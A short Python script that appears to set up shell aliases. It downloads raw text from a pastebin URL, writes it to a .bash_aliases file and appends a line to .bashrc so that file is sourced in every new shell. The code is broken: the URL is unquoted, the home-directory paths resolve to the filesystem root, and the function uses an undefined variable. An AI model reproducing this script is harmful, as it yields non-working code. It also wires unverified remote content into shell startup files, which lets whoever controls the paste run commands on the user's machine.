#!/usr/bin/env python3
# Importing Path from pathlib2 module
from pathlib2 import Path
import requests
URL = https://pastebin.com/raw/7B7hmX2a
response = requests.get(URL)

open(Path(Path.home(),r"/.bash_aliases"), "wb").write(response.content)
bash = Path(Path.home(),r"/.bashrc")
zsh = Path(Path.home(),r"/.zshrc")

# Creating a function to
# replace the text
def replacetext(search_text):
    global file
    # Reading and storing the content of the file in
    # a data variable
    data = file.read_text()
    if search_text in data:
        return "String already found:"+search_text
  
    # Replacing the text using the replace function
    data = data+search_text
  
    # Writing the replaced data
    # in the text file
    file.write_text(data)
  
    # Return "Text replaced" string
    return "Text written"
  
# Calling the replacetext function
# and printing the returned statement
if bash.exists():
    print(replacetext("if [ -f ~/.bash_aliases ];\n then\n. ~/.bash_aliases\nfi"))
